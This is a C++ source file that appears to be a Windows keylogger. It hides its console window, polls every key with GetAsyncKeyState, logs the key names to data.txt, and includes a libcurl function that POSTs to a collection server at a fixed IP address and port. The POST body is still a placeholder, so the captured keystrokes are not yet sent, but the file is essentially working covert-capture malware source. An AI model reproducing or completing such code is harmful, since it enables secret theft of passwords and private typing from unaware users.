#include <iostream>
#include <windows.h>
#include <string>
#include <fstream>
#include <map>
#include <vector>
#include <curl/curl.h>


namespace keys{
const std::map<int, std::string> key_codes {
    {8, "BackSpace"},
    {13, "Return"},
    {27, "Escape"},
    {32, "Space"},
    {48, "0"},
    {49, "1"},
    {50, "2"},
    {51, "3"},
    {52, "4"},
    {53, "5"},
    {54, "6"},
    {55, "7"},
    {56, "8"},
    {57, "9"},
    {65, "A"},
    {66, "B"},
    {67, "C"},
    {68, "D"},
    {69, "E"},
    {70, "F"},
    {71, "G"},
    {72, "H"},
    {73, "I"},
    {74, "J"},
    {75, "K"},
    {76, "L"},
    {77, "M"},
    {78, "N"},
    {79, "O"},
    {80, "P"},
    {81, "Q"},
    {82, "R"},
    {83, "S"},
    {84, "T"},
    {85, "U"},
    {86, "V"},
    {87, "W"},
    {88, "X"},
    {89, "Y"},
    {90, "Z"},
    {96, "NumPad0"},
    {97, "NumPad1"},
    {98, "NumPad2"},
    {99, "NumPad3"},
    {100, "NumPad4"},
    {101, "NumPad5"},
    {102, "NumPad6"},
    {103, "NumPad7"},
    {104, "NumPad8"},
    {105, "NumPad9"},
    {112, "F1"},
    {113, "F2"},
    {114, "F3"},
    {115, "F4"},
    {116, "F5"},
    {117, "F6"},
    {118, "F7"},
    {119, "F8"},
    {120, "F9"},
    {121, "F10"},
    {122, "F11"},
    {123, "F12"},
    {124, "F13"},
    {125, "F14"},
    {126, "F15"},
    {127, "F16"},
    {186, "SemiColon"},
    {187, "Equals"},
    {188, "Comma"},
    {189, "UnderScore"},
    {190, "Period"},
    {191, "Slash"},
    {220, "BackSlash"},
    {221, "RightBrace"},
    {219, "LeftBrace"},
    {222, "Apostrophe"}
};
}


size_t WriteCallback(void *contents, size_t size, size_t nmemb, std::string *buffer) {
    size_t total_size = size * nmemb;
    buffer->append((char*)contents, total_size);
    return total_size;
}


void save_data(std::vector<std::string>& data, const std::string& filePath){
    std::ofstream file(filePath, std::ios::app);

    if(file.is_open()){

        //escribimos los datos en el txt
        for(const auto& entry : data){
            if(entry == "Return")
                file << entry << "\n";

            file << entry;
        }
        file.close();
        data.clear();
    }
}

//verificamos si el bit más significativo está a 1 (el valor es negativo)
//lo que significa que la tecla está presionada
bool isKeyPressed(int key){
    return GetAsyncKeyState(key) & 0x8000;
}



void sendPost(std::string post_data){
    CURL *curl;
    CURLcode res;

    /* In windows, this inits the winsock stuff */
    curl_global_init(CURL_GLOBAL_ALL);

    /* get a curl handle */
    curl = curl_easy_init();
    if(curl) {
        /* First set the URL that is about to receive our POST. This URL can
           just as well be an https:// URL if that is what should receive the
           data. */
        curl_easy_setopt(curl, CURLOPT_URL, "http://192.168.1.118:5000/receive");
        /* Now specify the POST data */
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, "name=daniel&project=curl");

        /* Perform the request, res gets the return code */
        res = curl_easy_perform(curl);
        /* Check for errors */
        if(res != CURLE_OK)
            fprintf(stderr, "curl_easy_perform() failed: %s\n",
                    curl_easy_strerror(res));

        /* always cleanup */
        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();
}


int main(){
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);
    std::vector<std::string> buffer;
    std::map<int, bool> key_status;

    bool exit = false;

    while(!exit){
        for (int i = 0; i < 256; i++){

            if(isKeyPressed(i)){
                auto it = keys::key_codes.find(i);

                if(it != keys::key_codes.end() && !key_status[i]){

                    std::cout << it->second << "\n";

                    if(it->second == "Escape"){
                        save_data(buffer, "data.txt");
                        exit = true;
                    }


                    buffer.push_back(it->second);
                    key_status[i] = true;
                }

                else{
                    key_status[i] = false;
                }
            }
        }
    }
    sendPost("");
    return 0;
}